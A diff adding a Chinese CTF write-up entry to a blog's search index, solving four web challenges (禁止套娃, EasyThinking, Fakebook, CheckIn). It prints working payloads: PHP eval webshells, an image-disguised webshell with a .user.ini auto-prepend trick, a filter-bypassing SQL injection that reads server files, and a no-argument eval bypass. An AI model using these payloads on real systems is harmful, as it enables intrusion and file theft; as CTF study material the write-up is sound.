@@ -1177,4 +1177,83 @@ fputs(fopen('shell.php','w'),'<?php @eval($_POST['df']); ?><p>‘);</p>
 
 ]]></content>
   </entry>
+  <entry>
+    <title>tp</title>
+    <url>/2023/01/29/tp/</url>
+    <content><![CDATA[<h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>git泄露源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>包含了flag，但是伪协议被过滤了</p>
+<p>查wp得知session_id()可控,在php上可以用来获取或设置当前会话ID。</p>
+<p>如果指定了 id 参数的值， 则使用指定值作为会话 ID。因为包含了flag.php，所以我们可以把cookie:PHPSESSID&#x3D;flag.php</p>
+<p>在我们使用 session_id()的时候 需要使用session_start()来开启session会话</p>
+<p>使用exp来输出flag</p>
+<p>使用session之前需要通过session_start()告诉PHP使用session，php默认是不主动使用session的。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?exp=highlight_file(session_id(session_start()));</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="GYCTF2020-EasyThinking"><a href="#GYCTF2020-EasyThinking" class="headerlink" title="[GYCTF2020]EasyThinking"></a>[GYCTF2020]EasyThinking</h2><p>扫一下，发现<a href="http://www.zip源码/">www.zip源码</a></p>
+<p>Store.php中save方法中有一个write函数，在write函数中</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">clearFlashData</span>();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$sessionId</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getId</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;data)) &#123;</span><br><span class="line">            <span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">serialize</span>(<span class="variable">$this</span>-&gt;data);</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handler-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$sessionId</span>, <span class="variable">$data</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handler-&gt;<span class="title function_ invoke__">delete</span>(<span class="variable">$sessionId</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;init = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$sessID</span>, <span class="keyword">string</span> <span class="variable">$sessData</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getFileName</span>(<span class="variable">$sessID</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="variable">$data</span>     = <span class="variable">$sessData</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;config[<span class="string">&#x27;data_compress&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;gzcompress&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">//数据压缩</span></span><br><span class="line">            <span class="variable">$data</span> = <span class="title function_ invoke__">gzcompress</span>(<span class="variable">$data</span>, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">writeFile</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>在writeFile函数中具有file_put_contents()函数，此处为搜索部分</p>
+<p>filename来自$sessionId</p>
+<p>save方法的getid()前面有setid</p>
+<p>在setid方法中，发现id需要满足32位</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"><span class="variable">$request</span>, <span class="built_in">Closure</span> <span class="variable">$next</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// Session初始化</span></span><br><span class="line">        <span class="variable">$varSessionId</span> = <span class="variable language_">$this</span>-&gt;app-&gt;config-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;session.var_session_id&#x27;</span>);</span><br><span class="line">        <span class="variable">$cookieName</span>   = <span class="variable language_">$this</span>-&gt;session-&gt;<span class="title function_ invoke__">getName</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$varSessionId</span> &amp;&amp; <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">request</span>(<span class="variable">$varSessionId</span>)) &#123;</span><br><span class="line">            <span class="variable">$sessionId</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">request</span>(<span class="variable">$varSessionId</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$sessionId</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">cookie</span>(<span class="variable">$cookieName</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$sessionId</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;session-&gt;<span class="title function_ invoke__">setId</span>(<span class="variable">$sessionId</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>sessionId也就是filename来源是cookieName，cookieName通过getName()方法赋值，getName()的返回值是<code>$name=&#39;PHPSESSID&#39;</code></p>
+<p>也就是说，filename来自PHPSESSID</p>
+<p>所以我们先把PHPSESSID改成32位长度的php文件名</p>
+<p>再在搜索处写入webshell，这样我们的webshell成功保存在后台</p>
+<p>读取phpinfo()</p>
+<p><img src="/2023/01/29/tp/2..jpg"></p>
+<p>发现禁用很多函数</p>
+<p>不能用system了</p>
+<p>链接蚁剑发现有readflag文件，但是和flag一样打不开，查阅wp，由于用户具有写入tmp文件的权限</p>
+<p>使用<a href="https://github.com/mm0r1/exploits%E7%9A%84exp%EF%BC%8C%E5%B0%86%E5%91%BD%E4%BB%A4%E6%94%B9%E4%B8%BAreadflag%EF%BC%8C%E5%86%8D%E5%AF%B9%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8C%E5%8C%85%E5%90%AB%EF%BC%8C%E5%8F%91%E7%8E%B0flag">https://github.com/mm0r1/exploits的exp，将命令改为readflag，再对文件进行包含，发现flag</a></p>
+<h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><p>先登录</p>
+<p>用户名可以点击，点击后看到有?no&#x3D;,尝试注入</p>
+<p>?no &#x3D; 1 and 1&#x3D;1正常</p>
+<p>?no &#x3D; 1 and 1&#x3D;2报错</p>
+<p>数字型注入</p>
+<p>使用order测试一下，最后发现有4个字段</p>
+<p>使用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union select 1,2,3,4--+</span><br></pre></td></tr></table></figure>
+
+<p>错误，测试什么被过滤了，单独使用空格，select，union都没有出现hack</p>
+<p>查wp说<code>union select</code>被过滤了，可以使用union&#x2F;**&#x2F;select</p>
+<p>回显在username，2，所以在2的位置使用sql语句</p>
+<p>我们在select user()的时候发现具有root权限</p>
+<p>查资料发现root下<code>load_file()</code>函数可以利用绝对路径去加载一个文件</p>
+<p>所以可以构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,load_file(&quot;/var/www/html/flag.php&quot;),3,4--+</span><br></pre></td></tr></table></figure>
+
+<p>在源代码中发现flag</p>
+<p><img src="/2023/01/29/tp/11.jpg"></p>
+<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>过滤了php，phtml等后缀名，也过滤掉了文件中的&lt;?</p>
+<p>题目有回显exif_imagetype，</p>
+<p>exif_imagetype ( string <code>$filename</code> ) : int</p>
+<p>exif_imagetype() 读取一个图像的第一个字节并检查其签名。</p>
+<p>可以在文件头上加上GIF89a，再把文件后缀为jpg</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;</span><br><span class="line">eval($_POST[&#x27;a&#x27;]);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>但是测试htaccess,发现行不通</p>
+<p>查资料发现可以用.user.ini把文件包含进php文件</p>
+<p>在php.ini中，包括<code>PHP_INI_SYSTEM</code>,<code>PHP_INI_PERDIR</code>,<code>PHP_INI_ALL</code>,<code>PHP_INI_USER</code></p>
+<p>除了主 php.ini 之外，PHP 还会在每个目录下扫描ini文件,在 .user.ini 格式的ini 文件中只有具有 <code>PHP_INI_PERDIR</code> 和 <code>PHP_INI_USER</code> 模式的 INI 设置可被识别。</p>
+<p>.user.ini是一个能被动态加载的ini文件。也就是说修改了.user.ini后，不需要重启服务器中间件，只需要等待user_ini.cache_ttl所设置的时间，即可被重新加载。</p>
+<p>看wp说auto_append_file，指定一个文件，自动包含在要执行的文件前，正好我们可以使用 user.ini修改<code>PHP_INI_PERDIR</code> </p>
+<p><img src="/2023/01/29/tp/1.jpg"></p>
+<p>上传.user.ini文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=1.jpg</span><br></pre></td></tr></table></figure>
+
+<p>在上传一个jpg格式的webshell</p>
+<p>如上</p>
+<p>可以直接进行a&#x3D;system(“cat &#x2F;flag”);</p>
+]]></content>
+  </entry>
 </search>
